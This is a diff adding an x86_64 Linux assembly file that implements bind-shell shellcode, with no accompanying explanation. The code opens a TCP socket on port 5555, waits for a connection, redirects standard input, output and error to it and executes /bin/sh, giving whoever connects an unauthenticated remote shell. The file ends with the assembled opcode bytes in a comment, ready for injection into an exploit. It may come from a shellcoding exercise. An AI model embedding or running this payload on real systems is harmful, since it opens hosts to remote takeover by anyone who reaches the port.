@@ -1,0 +1,105 @@
+global _start
+
+_start:
+
+mov rbp, rsp 
+xor rdi, rdi
+xor rsi, rsi
+xor rdx, rdx
+xor r10, r10
+
+;create sockaddr in
+xor rax, rax
+push rax
+push ax
+push ax
+mov ax, 0xb315
+push ax ; port 5555
+mov ax, 0x02
+push ax ; AF_INET
+
+;create socket
+mov al, 0x29 ; syscall for x86_64 socket
+mov rdi, 0x02 ;AF_INET family
+mov rsi, 0x01 ; SOCK_STReAM
+xor rdx, rdx 
+syscall
+mov r9, rax 
+
+;bind the socket
+xor rax, rax
+mov al, 0x31
+mov rdi, r9
+mov rsi, rsp
+mov rdx, rbp
+sub rdx, rsp
+syscall
+
+;listen
+xor rax, rax
+mov al, 0x32
+mov rdi, r9
+xor rsi, rsi
+syscall
+
+;accept4
+xor rax, rax
+mov ax, 0x120
+mov rdi, r9
+xor rsi, rsi
+xor rdx, rdx,
+xor r10, r10
+syscall
+mov r8, rax ;r8 is now the connection decriptor
+
+;dup2
+mov r12, 0x3
+dup2:
+dec r12
+xor rax, rax
+mov al, 0x21
+mov rdi, r8
+mov rsi, r12
+syscall
+test r12, r12
+jne dup2
+
+;execve
+xor rax, rax
+mov al, 0x3b
+mov rdi, 0x0068732f6e69622f
+push rdi
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+syscall
+
+xor rax, rax
+mov al, 0x3c
+xor rdi, rdi
+syscall
+
+;Raw bytes:
+;\x48\x89\xE5\x48\x31\xFF\x48\x31
+;\xF6\x48\x31\xD2\x4D\x31\xD2\x48
+;\x31\xC0\x50\x66\x50\x66\x50\x66
+;\xB8\x15\xB3\x66\x50\x66\xB8\x02
+;\x00\x66\x50\xB0\x29\x48\xC7\xC7
+;\x02\x00\x00\x00\x48\xC7\xC6\x01
+;\x00\x00\x00\x48\x31\xD2\x0F\x05
+;\x49\x89\xC1\x48\x31\xC0\xB0\x31
+;\x4C\x89\xCF\x48\x89\xE6\x48\x89
+;\xEA\x48\x29\xE2\x0F\x05\x48\x31
+;\xC0\xB0\x32\x4C\x89\xCF\x48\x31
+;\xF6\x0F\x05\x48\x31\xC0\x66\xB8
+;\x20\x01\x4C\x89\xCF\x48\x31\xF6
+;\x48\x31\xD2\x4D\x31\xD2\x0F\x05
+;\x49\x89\xC0\x49\xC7\xC4\x03\x00
+;\x00\x00\x49\xFF\xCC\x48\x31\xC0
+;\xB0\x21\x4C\x89\xC7\x4C\x89\xE6
+;\x0F\x05\x4D\x85\xE4\x75\xEB\x48
+;\x31\xC0\xB0\x3B\x48\xBF\x2F\x62
+;\x69\x6E\x2F\x73\x68\x00\x57\x48
+;\x89\xE7\x48\x31\xF6\x48\x31\xD2
+;\x0F\x05\x48\x31\xC0\xB0\x3C\x48
+;\x31\xFF\x0F\x05
